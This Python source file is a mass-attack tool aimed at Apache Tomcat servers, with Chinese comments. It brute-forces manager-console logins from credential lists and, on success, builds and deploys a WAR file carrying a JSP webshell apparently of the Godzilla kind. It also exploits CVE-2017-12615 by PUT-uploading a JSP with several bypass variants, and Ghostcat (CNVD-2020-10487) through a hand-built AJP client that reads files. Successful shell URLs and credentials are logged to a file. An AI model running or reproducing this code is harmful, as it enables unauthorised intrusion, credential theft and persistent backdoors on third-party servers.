import yaml
import logging
import requests
from requests.auth import HTTPBasicAuth
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time
import re
from bs4 import BeautifulSoup
import zipfile
import random
import string
import socket
import struct

# 忽略HTTPS请求中的不安全请求警告
requests.packages.urllib3.disable_warnings()

# 配置日志格式，输出INFO级别及以上的日志消息
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()


# 加载配置文件
def load_config(config_file):
    with open(config_file, 'r', encoding='utf-8') as file:
        return yaml.safe_load(file)


# 通用文件读取函数：用于加载用户名、密码或URL列表文件
def load_file(file_path):
    if not os.path.isfile(file_path):
        logger.error(f"文件 {file_path} 不存在")
        return []
    with open(file_path, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines()]


# 清理URL以确保路径正确
def clean_url(url):
    return url.rstrip('/manager/html')


# 生成随机的6位数字字母组合，用于WAR包和JSP文件名
def generate_random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


# 生成 WAR 文件，其中包含 Godzilla Webshell
def generate_war(config):
    shell_content = config['files'].get('shell_file_content', '<%-- 默认的 shell.jsp 内容 --%>')
    random_string = generate_random_string()
    war_file_name = f"{random_string}.war"
    shell_file_name = f"{generate_random_string()}.jsp"

    try:
        # 创建临时 JSP 文件
        with open(shell_file_name, 'w', encoding='utf-8') as jsp_file:
            jsp_file.write(shell_content)

        # 生成 WAR 包
        with zipfile.ZipFile(war_file_name, 'w', zipfile.ZIP_DEFLATED) as war:
            war.write(shell_file_name, shell_file_name)

        # 删除临时 JSP 文件
        os.remove(shell_file_name)

        return war_file_name, random_string, shell_file_name
    except Exception as e:
        logger.error(f"[-] WAR 包生成失败: {str(e)}")
        return None, None, None


# 获取登录后的JSESSIONID和CSRF_NONCE，用于进一步的WAR文件上传
def get_jsessionid_and_csrf_nonce(url, username, password):
    try:
        login_url = f"{url}/manager/html"
        response = requests.get(login_url, auth=HTTPBasicAuth(username, password), verify=False, timeout=10)
        response.raise_for_status()

        cookies = response.cookies
        jsessionid = cookies.get('JSESSIONID')
        if not jsessionid:
            return None, None, None, False

        # 使用 BeautifulSoup 解析 HTML 并提取 CSRF_NONCE 和文件上传字段名
        soup = BeautifulSoup(response.text, 'html.parser')

        # 提取 CSRF_NONCE 值
        csrf_nonce_match = re.search(r'org\.apache\.catalina\.filters\.CSRF_NONCE=([A-F0-9]+)', response.text)
        csrf_nonce = csrf_nonce_match.group(1) if csrf_nonce_match else None

        # 提取文件上传字段名
        file_input = soup.find('input', {'type': 'file'})
        file_field_name = file_input['name'] if file_input else 'file'

        return jsessionid, csrf_nonce, file_field_name, True
    except requests.exceptions.RequestException as e:
        logger.warning(f"{Fore.YELLOW}[!] 网络错误 {url}: {str(e)}{Style.RESET_ALL}")
        return None, None, None, False


# 部署 Godzilla Webshell 并尝试访问上传的 Webshell
def deploy_godzilla_war(url, username, password, war_file_path, random_string, shell_file_name, output_file,
                        max_retries, retry_delay):
    url = clean_url(url)  # 清理 URL，确保格式正确
    jsessionid, csrf_nonce, file_field_name, success = get_jsessionid_and_csrf_nonce(url, username, password)

    if not success:
        # 如果未能获取 JSESSIONID、csrf_nonce，则删除 WAR 文件
        if os.path.isfile(war_file_path):
            try:
                os.remove(war_file_path)
            except OSError as e:
                logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")
        return

    attempt = 0
    while attempt < max_retries:
        try:
            # 使用获取到的 JSESSIONID 和 CSRF_NONCE 进行上传
            deploy_url = f"{url}/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE={csrf_nonce}"
            cookies = {'JSESSIONID': jsessionid}
            with open(war_file_path, 'rb') as war_file:
                files = {file_field_name: (os.path.basename(war_file_path), war_file, 'application/octet-stream')}
                response = requests.post(deploy_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                         files=files, verify=False, timeout=10)
            response.raise_for_status()
            shell_url = f"{url}/{random_string}/{shell_file_name}"
            shell_response = requests.get(shell_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
                                          verify=False, timeout=10)
            if shell_response.status_code == 200:
                logger.info(f"{Fore.RED}[+] 成功获取 Webshell: {shell_url}{Style.RESET_ALL}")
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write(f"{url} {username}:{password} - Webshell: {shell_url}\n")
            else:
                logger.warning(f"{Fore.YELLOW}[!] 获取 Webshell 失败: {shell_url} {Style.RESET_ALL}")
            break  # 成功后退出循环
        except requests.exceptions.RequestException as e:
            logger.warning(f"{Fore.YELLOW}[!] 网站访问失败 {url}: {str(e)}{Style.RESET_ALL}")

        attempt += 1
        if attempt < max_retries:
            logger.info(f"{Fore.CYAN}[!] 重试上传 ({attempt}/{max_retries})...{Style.RESET_ALL}")
            time.sleep(retry_delay)  # 重试前等待设定时间

    # 上传成功或失败后，删除 WAR 文件
    if os.path.isfile(war_file_path):
        try:
            os.remove(war_file_path)
        except OSError as e:
            logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")


# 弱口令检测函数
def check_weak_password(url, usernames, passwords, output_file, max_retries, retry_delay, config):
    base_url = url.rstrip('/')
    if not base_url.endswith('/manager/html'):
        url_with_path = f"{base_url}/manager/html"
    else:
        url_with_path = url
    attempt = 0
    while attempt < max_retries:
        try:
            for username in usernames:
                for password in passwords:
                    response = requests.get(url_with_path, auth=HTTPBasicAuth(username, password), timeout=10,
                                            verify=False)
                    if response.status_code == 200:
                        success_entry = f"{url_with_path} {username}:{password}"
                        logger.info(f"{Fore.RED}[+] 登录成功 {success_entry}{Style.RESET_ALL}")
                        with open(output_file, 'a', encoding='utf-8') as f:
                            f.write(success_entry + "\n")

                        # 登录成功后生成WAR文件
                        war_file_name, random_string, shell_file_name = generate_war(config)
                        if war_file_name:
                            # 部署 Godzilla WAR 包并尝试获取 shell
                            deploy_godzilla_war(url_with_path, username, password, war_file_name, random_string,
                                                shell_file_name,
                                                output_file,
                                                config['retry']['deploy_godzilla_war']['max_retries'],
                                                config['retry']['deploy_godzilla_war']['retry_delay'])
                        return (url_with_path, username, password)
                    else:
                        logger.info(
                            f"{Fore.GREEN}[-] 失败: {username}:{password} {Fore.WHITE}({response.status_code}) {Fore.BLUE}{url_with_path}{Style.RESET_ALL}")
            break  # 如果检查完所有用户密码对则退出循环
        except requests.exceptions.RequestException as e:
            logger.warning(
                f"{Fore.YELLOW}[!] 网站无法访问 {url_with_path} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
            time.sleep(retry_delay)  # 重试前等待
            attempt += 1
    if attempt == max_retries:
        logger.error(
            f"{Fore.CYAN}[*] 最大重试次数已达，无法访问 {url_with_path}，将该 URL 从检测列表中移除 {Style.RESET_ALL}")
        return None  # 返回 None 表示该 URL 无法访问

    return url, None, None


# 动态调整线程池大小，确保资源使用合理
def adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread):
    if combination_count <= 0:
        return min_workers
    # 根据用户配置的每多少个组合分配一个线程，并确保至少有min_workers个线程
    calculated_workers = max((combination_count + combination_per_thread - 1) // combination_per_thread, min_workers)

    # 保证线程数不超过max_workers_limit
    workers = min(calculated_workers, max_workers_limit)
    logger.info(f"根据用户名和密码组合总数 {combination_count} 调整线程池大小为 {workers}")
    return workers


def validate_config(config):
    required_fields = {
        'files': ['url_file', 'user_file', 'passwd_file', 'output_file', 'shell_file_content'],
        'retry': ['check_weak_password', 'deploy_godzilla_war'],
        'thread_pool': ['max_workers_limit', 'min_workers', 'combination_per_thread']
    }

    for section, fields in required_fields.items():
        if section not in config:
            logger.error(f"配置文件中缺少 {section} 部分")
            return False
        for field in fields:
            if field not in config[section]:
                logger.error(f"配置文件中 {section} 部分缺少 {field} 字段")
                return False

    return True


def pack_string(s):
    if s is None:
        return struct.pack(">h", -1)
    l = len(s)
    return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)


def unpack(stream, fmt):
    size = struct.calcsize(fmt)
    buf = stream.read(size)
    return struct.unpack(fmt, buf)


def unpack_string(stream):
    size, = unpack(stream, ">h")
    if size == -1:  # null string
        return None
    res, = unpack(stream, "%ds" % size)
    stream.read(1)  # \0
    return res


class NotFoundException(Exception):
    pass


class AjpBodyRequest(object):
    # server == web server, container == servlet
    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
    MAX_REQUEST_LENGTH = 8186

    def __init__(self, data_stream, data_len, data_direction=None):
        self.data_stream = data_stream
        self.data_len = data_len
        self.data_direction = data_direction

    def serialize(self):
        data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)
        if len(data) == 0:
            return struct.pack(">bbH", 0x12, 0x34, 0x00)
        else:
            res = struct.pack(">H", len(data))
            res += data
        if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:
            header = struct.pack(">bbH", 0x12, 0x34, len(res))
        else:
            header = struct.pack(">bbH", 0x41, 0x42, len(res))
        return header + res

    def send_and_receive(self, socket, stream):
        while True:
            data = self.serialize()
            socket.send(data)
            r = AjpResponse.receive(stream)
            while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:
                r = AjpResponse.receive(stream)

            if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:
                break


class AjpForwardRequest(object):
    _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(
        28)
    REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE,
                       'TRACE': TRACE}
    # server == web server, container == servlet
    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
    COMMON_HEADERS = ["SC_REQ_ACCEPT",
                      "SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING", "SC_REQ_ACCEPT_LANGUAGE",
                      "SC_REQ_AUTHORIZATION",
                      "SC_REQ_CONNECTION", "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE",
                      "SC_REQ_COOKIE2",
                      "SC_REQ_HOST", "SC_REQ_PRAGMA", "SC_REQ_REFERER", "SC_REQ_USER_AGENT"
                      ]
    ATTRIBUTES = ["context", "servlet_path", "remote_user", "auth_type", "query_string", "route", "ssl_cert",
                  "ssl_cipher", "ssl_session", "req_attribute", "ssl_key_size", "secret", "stored_method"]

    def __init__(self, data_direction=None):
        self.prefix_code = 0x02
        self.method = None
        self.protocol = None
        self.req_uri = None
        self.remote_addr = None
        self.remote_host = None
        self.server_name = None
        self.server_port = None
        self.is_ssl = None
        self.num_headers = None
        self.request_headers = None
        self.attributes = None
        self.data_direction = data_direction

    def pack_headers(self):
        self.num_headers = len(self.request_headers)
        res = ""
        res = struct.pack(">h", self.num_headers)
        for h_name in self.request_headers:
            if h_name.startswith("SC_REQ"):
                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1
                res += struct.pack("BB", 0xA0, code)
            else:
                res += pack_string(h_name)

            res += pack_string(self.request_headers[h_name])
        return res

    def pack_attributes(self):
        res = b""
        for attr in self.attributes:
            a_name = attr['name']
            code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1
            res += struct.pack("b", code)
            if a_name == "req_attribute":
                aa_name, a_value = attr['value']
                res += pack_string(aa_name)
                res += pack_string(a_value)
            else:
                res += pack_string(attr['value'])
        res += struct.pack("B", 0xFF)
        return res

    def serialize(self):
        res = ""
        res = struct.pack("bb", self.prefix_code, self.method)
        res += pack_string(self.protocol)
        res += pack_string(self.req_uri)
        res += pack_string(self.remote_addr)
        res += pack_string(self.remote_host)
        res += pack_string(self.server_name)
        res += struct.pack(">h", self.server_port)
        res += struct.pack("?", self.is_ssl)
        res += self.pack_headers()
        res += self.pack_attributes()
        if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:
            header = struct.pack(">bbh", 0x12, 0x34, len(res))
        else:
            header = struct.pack(">bbh", 0x41, 0x42, len(res))
        return header + res

    def parse(self, raw_packet):
        stream = StringIO(raw_packet)
        self.magic1, self.magic2, data_len = unpack(stream, "bbH")
        self.prefix_code, self.method = unpack(stream, "bb")
        self.protocol = unpack_string(stream)
        self.req_uri = unpack_string(stream)
        self.remote_addr = unpack_string(stream)
        self.remote_host = unpack_string(stream)
        self.server_name = unpack_string(stream)
        self.server_port = unpack(stream, ">h")
        self.is_ssl = unpack(stream, "?")
        self.num_headers, = unpack(stream, ">H")
        self.request_headers = {}
        for i in range(self.num_headers):
            code, = unpack(stream, ">H")
            if code > 0xA000:
                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]
            else:
                h_name = unpack(stream, "%ds" % code)
                stream.read(1)  # \0
            h_value = unpack_string(stream)
            self.request_headers[h_name] = h_value

    def send_and_receive(self, socket, stream, save_cookies=False):
        res = []
        i = socket.sendall(self.serialize())
        if self.method == AjpForwardRequest.POST:
            return res

        r = AjpResponse.receive(stream)
        assert r.prefix_code == AjpResponse.SEND_HEADERS
        res.append(r)
        if save_cookies and 'Set-Cookie' in r.response_headers:
            self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie']

        # read body chunks and end response packets
        while True:
            r = AjpResponse.receive(stream)
            res.append(r)
            if r.prefix_code == AjpResponse.END_RESPONSE:
                break
            elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:
                continue
            else:
                raise NotImplementedError
                break

        return res


class AjpResponse(object):
    _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)
    COMMON_SEND_HEADERS = [
        "Content-Type", "Content-Language", "Content-Length", "Date", "Last-Modified",
        "Location", "Set-Cookie", "Set-Cookie2", "Servlet-Engine", "Status", "WWW-Authenticate"
    ]

    def parse(self, stream):
        # read headers
        self.magic, self.data_length, self.prefix_code = unpack(stream, ">HHb")

        if self.prefix_code == AjpResponse.SEND_HEADERS:
            self.parse_send_headers(stream)
        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:
            self.parse_send_body_chunk(stream)
        elif self.prefix_code == AjpResponse.END_RESPONSE:
            self.parse_end_response(stream)
        elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:
            self.parse_get_body_chunk(stream)
        else:
            raise NotImplementedError

    def parse_send_headers(self, stream):
        self.http_status_code, = unpack(stream, ">H")
        self.http_status_msg = unpack_string(stream)
        self.num_headers, = unpack(stream, ">H")
        self.response_headers = {}
        for i in range(self.num_headers):
            code, = unpack(stream, ">H")
            if code <= 0xA000:  # custom header
                h_name, = unpack(stream, "%ds" % code)
                stream.read(1)  # \0
                h_value = unpack_string(stream)
            else:
                h_name = AjpResponse.COMMON_SEND_HEADERS[code - 0xA001]
                h_value = unpack_string(stream)
            self.response_headers[h_name] = h_value

    def parse_send_body_chunk(self, stream):
        self.data_length, = unpack(stream, ">H")
        self.data = stream.read(self.data_length + 1)

    def parse_end_response(self, stream):
        self.reuse, = unpack(stream, "b")

    def parse_get_body_chunk(self, stream):
        rlen, = unpack(stream, ">H")
        return rlen

    @staticmethod
    def receive(stream):
        r = AjpResponse()
        r.parse(stream)
        return r

def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
    fr.method = method
    fr.protocol = "HTTP/1.1"
    fr.req_uri = req_uri
    fr.remote_addr = target_host
    fr.remote_host = None
    fr.server_name = target_host
    fr.server_port = 80
    fr.request_headers = {
        'SC_REQ_ACCEPT': 'text/html',
        'SC_REQ_CONNECTION': 'keep-alive',
        'SC_REQ_CONTENT_LENGTH': '0',
        'SC_REQ_HOST': target_host,
        'SC_REQ_USER_AGENT': 'Mozilla',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }
    fr.is_ssl = False
    fr.attributes = []
    return fr


class Tomcat(object):
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.connect((target_host, target_port))
        self.stream = self.socket.makefile("rb")

    def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
        self.req_uri = req_uri
        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,
                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))
        if user is not None and password is not None:
            self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + (
                        "%s:%s" % (user, password)).encode('base64').replace('\n', '')
        for h in headers:
            self.forward_request.request_headers[h] = headers[h]
        for a in attributes:
            self.forward_request.attributes.append(a)
        responses = self.forward_request.send_and_receive(self.socket, self.stream)
        if len(responses) == 0:
            return None, None
        snd_hdrs_res = responses[0]
        data_res = responses[1:-1]
        if len(data_res) == 0:
            print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
        return snd_hdrs_res, data_res


# CVE-2017-12615与CNVD_2020_10487漏洞检测函数
def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
    try:
        jsp_file_name = f"{generate_random_string()}.jsp"
        shell_file_content = config['files'].get('shell_file_content', '<%-- 默认的 shell 内容 --%>')

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Connection": "close",
            "Content-Type": "application/octet-stream"
        }

        # 清理 URL 确保正确格式
        url = clean_url(url)

        # 1. 检测CVE-2017-12615漏洞 (PUT方法上传JSP)
        exploit_methods = [
            f"{url}/{jsp_file_name}/",  # 利用方式 1: PUT /222.jsp/
            f"{url}/{jsp_file_name}%20",  # 利用方式 2: PUT /222.jsp%20
            f"{url}/{jsp_file_name}::$DATA"  # 利用方式 3: PUT /222.jsp::$DATA
        ]

        for idx, method_url in enumerate(exploit_methods):
            response = requests.put(method_url, data=shell_file_content, headers=headers, verify=False, timeout=10)
            if response.status_code in [201, 204]:
                check_url = f"{url}/{jsp_file_name}"
                check_response = requests.get(check_url, verify=False, timeout=10)

                if check_response.status_code == 200:
                    logger.info(
                        f"{Fore.RED}[+] CVE-2017-12615 远程代码执行成功: {check_url} {Style.RESET_ALL} (利用方式: {method_url})")
                    return True, "CVE-2017-12615", check_url  # 返回漏洞类型和URL
                else:
                    logger.warning(
                        f"{Fore.RED}[!] CVE-2017-12615 文件上传成功，但访问失败: {check_url} {Style.RESET_ALL}")
            else:
                logger.warning(
                    f"{Fore.GREEN}[-] 失败: CVE-2017-12615 漏洞利用方式{idx + 1} {Fore.WHITE}({response.status_code}) {method_url} {Style.RESET_ALL}")

        # 2. 检测CNVD-2020-10487漏洞 (AJP协议漏洞本地文件包含)
        try:
            target_host = url.split("://")[-1].split("/")[0]
            # 从配置文件中读取 CNVD-2020-10487 的 AJP 端口、文件路径和判断条件
            target_port = config['cnvd_2020_10487']['port']
            file_path = config['cnvd_2020_10487']['file_path']
            lfi_check = config['cnvd_2020_10487']['lfi_check']  #

            # 初始化Tomcat AJP连接
            t = Tomcat(target_host, target_port)

            # 发送请求，尝试进行LFI (本地文件包含)
            _, data = t.perform_request('/asdf', attributes=[
                {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', file_path]},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']}
            ])

            if data:
                result_data = "".join([d.data.decode('utf-8') for d in data])
                if lfi_check in result_data:
                    logger.info(f"{Fore.RED}[+] CNVD-2020-10487 本地文件包含成功: {target_host}:{target_port} {Style.RESET_ALL}")
                    return True, "CNVD-2020-10487", f"ajp://{target_host}:{target_port}/WEB-INF/web.xml"  # 返回漏洞类型和URL
        except Exception as e:
            logger.warning(f"{Fore.GREEN}[-] 失败: CNVD-2020-10487 : {url} {str(e)} {Style.RESET_ALL}")

        return False, None, None  # 如果两个漏洞都未被利用成功，返回默认的失败值

    except requests.exceptions.RequestException as e:
        return False, None, None


# 在每个URL上执行CVE-2017-12615、CNVD_2020_10487检测并继续进行弱口令检测
def detect_and_check(url, usernames, passwords, output_file, config):
    # 先进行CVE-2017-12615检测
    success, vuln_type, exploit_url = check_cve_2017_12615_and_cnvd_2020_10487(url, config)

    if success:
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(f"{url} - {vuln_type} Exploited: {exploit_url}\n")

    # 无论漏洞利用成功与否，都进行弱口令检测
    check_weak_password(url, usernames, passwords, output_file,
                        config['retry']['check_weak_password']['max_retries'],
                        config['retry']['check_weak_password']['retry_delay'],
                        config)


# 主函数
def main():
    # 加载配置文件
    config = load_config("config.yaml")

    # 验证配置文件
    if not validate_config(config):
        return

    # 加载 URL、用户名和密码文件
    urls = load_file(config['files']['url_file'])
    usernames = load_file(config['files']['user_file'])
    passwords = load_file(config['files']['passwd_file'])
    output_file = config['files']['output_file']

    # 获取线程池配置
    max_workers_limit = config['thread_pool']['max_workers_limit']
    min_workers = config['thread_pool']['min_workers']
    combination_per_thread = config['thread_pool'].get('combination_per_thread', 200)  # 默认200

    # 计算用户名和密码组合总数
    combination_count = len(urls) * len(usernames) * len(passwords)

    # 根据组合总数调整线程池大小
    workers = adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread)

    # 使用线程池执行检测任务
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [
            executor.submit(detect_and_check, url, usernames, passwords, output_file, config) for url in urls
        ]

        # 等待所有任务完成
        for future in as_completed(futures):
            result = future.result()


if __name__ == "__main__":
    main()
